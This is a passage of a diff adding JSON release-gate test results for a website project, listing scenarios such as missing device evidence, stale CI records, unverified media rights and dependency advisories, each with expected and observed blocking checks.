+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a failed test of the same target recorded beside the passing one",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a CI run of another repository",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an evidence file that is not JSON at all, beside valid records",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "observed": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an evidence backup file (desktop-chrome.json.bak)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "observed": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "serve.py (run by the recipient, shipped in the ZIP) edited after sign-off, committed, nothing re-recorded",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "shared source code the checks rely on (src/lib/seo.mjs) edited after verification",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed, evidence:ci-run (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "the CI workflow edited after verification",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed, evidence:ci-run, supportedRuntimes (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run, supportedRuntimes",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "an open Blocker finding",
+      "ok": true,
+      "expected": "BLOCKED by noBlockingFindings",
+      "observed": "BLOCKED by noBlockingFindings",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "an open Major finding",
+      "ok": true,
+      "expected": "BLOCKED by noBlockingFindings",
+      "observed": "BLOCKED by noBlockingFindings",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a finding with an unknown severity",
+      "ok": true,
+      "expected": "BLOCKED by noBlockingFindings",
+      "observed": "BLOCKED by noBlockingFindings",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a pre-release version (1.0.0-rc.1)",
+      "ok": true,
+      "expected": "BLOCKED by stableVersion",
+      "observed": "BLOCKED by stableVersion",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "VERSION.json and package.json disagree",
+      "ok": true,
+      "expected": "BLOCKED by versionConsistent",
+      "observed": "BLOCKED by versionConsistent",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a client configuration labelled as a demonstration",
+      "ok": true,
+      "rg": "RG-13",
+      "expected": "BLOCKED by versionConsistent, labelMatchesConfiguration",
+      "observed": "BLOCKED by versionConsistent, labelMatchesConfiguration",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "the demonstration flag left on in an indexable build (the build itself refuses)",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 1: file:///tmp/je-dryrun-Wyx11r/jade-and-ember/engineering/lib/site.mjs:17",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "indexing switched off but structured data left on (the build itself refuses)",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 1: file:///tmp/je-dryrun-Wyx11r/jade-and-ember/engineering/lib/site.mjs:17",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "indexing switched off (noindex true, no structured data)",
+      "ok": true,
+      "rg": "RG-13",
+      "expected": "BLOCKED by productionSeoComplete, searchReadiness",
+      "observed": "BLOCKED by productionSeoComplete, searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "structured data switched off",
+      "ok": true,
+      "expected": "BLOCKED by productionSeoComplete (may also: searchReadiness)",
+      "observed": "BLOCKED by productionSeoComplete",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "the demonstration copy (sample address, phone, \"fictional\" wording) put back into an indexable build (the build itself refuses)",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 1: file:///tmp/je-dryrun-Wyx11r/jade-and-ember/engineering/lib/site.mjs:17",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "no hosting target declared (seo.host)",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a crawler policy never decided (seo.crawlers)",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a crawler policy missing the AI-search decision",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "crawler identities no person has re-read (confirmedByPerson false)",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a crawler review older than its age limit",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "the crawler verification record deleted",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 2: Error: ENOENT: no such file or directory, open '/tmp/je-dryrun-Wyx11r/jade-and-ember/engin",
+      "allow": false
+    },
+    {
+      "g": "configuration",
+      "t": "a configuration that does not build",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 1: file:///tmp/je-dryrun-Wyx11r/jade-and-ember/engineering/lib/site.mjs:17",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no iphone-safari record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no android-chrome record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no sr-nvda-firefox record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:screen-reader",
+      "observed": "BLOCKED by evidence:screen-reader",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no sr-voiceover-macos-safari record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:screen-reader",
+      "observed": "BLOCKED by evidence:screen-reader",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no sr-talkback-android-chrome record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:screen-reader",
+      "observed": "BLOCKED by evidence:screen-reader",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no desktop-chrome record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no desktop-firefox record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no desktop-safari record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "no ci-run record",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "emulation offered as a physical device (E1 claimed as E3)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a desktop record offered as a physical device (E2 claimed as E3)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a physical-device record for another candidate artifact",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a physical-device record for different delivered files (assets tree differs)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a record with no candidate digest",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a record for a commit that does not exist",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an unfilled template",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an incomplete record (a result left empty)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:screen-reader",
+      "observed": "BLOCKED by evidence:screen-reader",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a record signed by no one",
+      "ok": true,
+      "expected": "BLOCKED by evidence:screen-reader",
+      "observed": "BLOCKED by evidence:screen-reader",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a tester that is a tool (Playwright Bot)",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a record dated in the future",
+      "ok": true,
+      "expected": "BLOCKED by evidence:browser-matrix",
+      "observed": "BLOCKED by evidence:browser-matrix",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a real-device record whose test failed",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an attachment that is not on disk",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "an attachment whose bytes changed after it was hashed",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "one attachment reused by two records",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device",
+      "observed": "BLOCKED by evidence:real-device",
+      "allow": false
+    },
+    {
+      "g": "evidence",
+      "t": "a record file that is not valid JSON",
+      "ok": true,
+      "expected": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "observed": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record for another candidate artifact",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record whose summary names another candidate than its build",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record made by other verification code",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record that reports fewer checks than the verifier defines",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record reporting a failing check",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record from a run on a person's machine",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record whose run id is not the URL's run",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record with no verification summary at all",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record whose run did not succeed",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record with no GitHub run URL",
+      "ok": true,
+      "expected": "BLOCKED by evidence:ci-run",
+      "observed": "BLOCKED by evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "ci-evidence",
+      "t": "a CI record on an earlier commit (the parent) with the same candidate: bound to the artifact, so it still counts",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "external-links",
+      "t": "RG-02: no external-links verification record",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks, externalLinksReview",
+      "observed": "BLOCKED by externalLinks, externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "RG-02: the external-link registry and verification file deleted after sign-off (the tool used to crash on a missing registry)",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, sbomVerified, dependencySecurity, recordsValid)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a verification for another destination list",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks, externalLinksReview",
+      "observed": "BLOCKED by externalLinks, externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a verification from a sandbox run",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks",
+      "observed": "BLOCKED by externalLinks",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a verification older than its limit",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks",
+      "observed": "BLOCKED by externalLinks",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a clickable link the destination refused (blocked)",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks",
+      "observed": "BLOCKED by externalLinks",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a clickable link that is gone (unavailable)",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks",
+      "observed": "BLOCKED by externalLinks",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a verified link through an http hop",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks",
+      "observed": "BLOCKED by externalLinks",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "a clickable destination on a reserved host (the ordering link)",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinks (may also: externalLinksReview)",
+      "observed": "BLOCKED by externalLinks, externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "RG-02: no external-links review",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview",
+      "observed": "BLOCKED by externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "an external-links review of another destination list",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview",
+      "observed": "BLOCKED by externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "an external-links review that relies on another verification record",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview",
+      "observed": "BLOCKED by externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "an external-links review that says the destinations were not opened",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview, recordsValid",
+      "observed": "BLOCKED by recordsValid, externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "an external-links review that was rejected",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview",
+      "observed": "BLOCKED by externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "an external-links review revoked by an authorised reviewer",
+      "ok": true,
+      "rg": "RG-02",
+      "expected": "BLOCKED by externalLinksReview",
+      "observed": "BLOCKED by externalLinksReview",
+      "allow": false
+    },
+    {
+      "g": "external-links",
+      "t": "history: a rejected review for an older build is only history",
+      "ok": true,
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: a rights verification that covers other media (inventory digest differs)",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by rightsVerification, mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: a rights verification with no inventory digest",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by rightsVerification, recordsValid, mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by recordsValid, rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: a rights verification with a basis the model does not know",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by rightsVerification, recordsValid, mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by recordsValid, rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: an image the inventory still lists as unverified",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: an inventory entry that names a rights record that does not exist",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: the rights verification revoked after the inventory was written (the inventory still says verified)",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by rightsVerification, mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: provider terms nobody has reviewed",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: the Noto Serif SC notice finding (F-G5-05) open",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "RG-03: the font notice differs from the font file again (the real mismatch restored)",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory",
+      "allow": false
+    },
+    {
+      "g": "rights",
+      "t": "a font file replaced after the inventory was written (hash differs)",
+      "ok": true,
+      "rg": "RG-03",
+      "expected": "BLOCKED by mediaRightsInventory (may also: socialImageRights)",
+      "observed": "BLOCKED by mediaRightsInventory",
+      "allow": false
+    },
+    {
+      "g": "social",
+      "t": "D-P4-3: a social image that is a delivered, inventoried, rights-verified file",
+      "ok": true,
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "social",
+      "t": "D-P4-3: a social image hosted on another site",
+      "ok": true,
+      "expected": "BLOCKED by socialImageRights (may also: externalLinks, externalLinksReview)",
+      "observed": "BLOCKED by socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "social",
+      "t": "D-P4-3: a social image that is not a delivered file",
+      "ok": true,
+      "expected": "BLOCKED by socialImageRights",
+      "observed": "BLOCKED by socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "social",
+      "t": "D-P4-3: a social image whose rights record is revoked",
+      "ok": true,
+      "expected": "BLOCKED by socialImageRights, rightsVerification, mediaRightsInventory",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: no supply-chain verification",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity, sbomVerified",
+      "observed": "BLOCKED by dependencySecurity, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a verification for another lockfile",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity, sbomVerified",
+      "observed": "BLOCKED by dependencySecurity, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a verification from a sandbox run",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: an old verification",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a high advisory",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a moderate advisory with no exception",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a moderate advisory whose exception expired",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: a moderate advisory with a current, planned exception must NOT block",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: registry signatures that failed",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-10: registry signatures that cover fewer packages than the lockfile",
+      "ok": true,
+      "rg": "RG-10",
+      "expected": "BLOCKED by dependencySecurity",
+      "observed": "BLOCKED by dependencySecurity",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: an SBOM digest different from the one the build regenerates",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by sbomVerified",
+      "observed": "BLOCKED by sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: a delivered file changed after the supply-chain record, the record not repeated",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by sbomVerified, verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, externalLinks)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, assetManifestCurrent, externalLinksReview, mediaRightsInventory, socialImageRights, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: the lockfile changed after the supply-chain record, the record not repeated",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by dependencySecurity, sbomVerified, verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: a development dependency with a loose version range",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by dependencyPolicy (may also: dependencySecurity, sbomVerified)",
+      "observed": "BLOCKED by dependencyPolicy",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: a licence taken off the allow-list",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by dependencyPolicy",
+      "observed": "BLOCKED by dependencyPolicy",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: the workflow back on an unsupported Node",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by supportedRuntimes, verifyPassed, evidence:ci-run",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run, supportedRuntimes",
+      "allow": false
+    },
+    {
+      "g": "supply",
+      "t": "RG-11: an Action no longer pinned to a commit",
+      "ok": true,
+      "rg": "RG-11",
+      "expected": "BLOCKED by supportedRuntimes, verifyPassed, evidence:ci-run",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run, supportedRuntimes",
+      "allow": false
+    },
+    {
+      "g": "authenticity",
+      "t": "RG-14: the policy edited to stop listing authenticity (verification re-sealed by the harness): the gate still judges it",
+      "ok": true,
+      "rg": "RG-14",
+      "expected": "BLOCKED by authenticity",
+      "observed": "BLOCKED by authenticity",
+      "allow": false
+    },
+    {
+      "g": "authenticity",
+      "t": "RG-14: everything else green; the real authenticity verifier (not implemented) is the only thing left",
+      "ok": true,
+      "rg": "RG-14",
+      "expected": "BLOCKED by authenticity",
+      "observed": "BLOCKED by authenticity",
+      "allow": false
+    },
+    {
+      "g": "environment",
+      "t": "gate --channel demonstration on a client-production configuration is refused",
+      "ok": true,
+      "detail": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\".",
+      "expected": "as stated",
+      "observed": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\"."
+    },
+    {
+      "g": "environment",
+      "t": "prepare --channel demonstration on a client-production configuration is refused",
+      "ok": true,
+      "detail": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\".",
+      "expected": "as stated",
+      "observed": "exit 1: REFUSED: this build is a client-production build (configuration: demo false, noindex false); it cannot be released as \"demonstration\"."
+    },
+    {
+      "g": "environment",
+      "t": "manifest --channel demonstration on a client-production configuration is refused",
+      "ok": true,
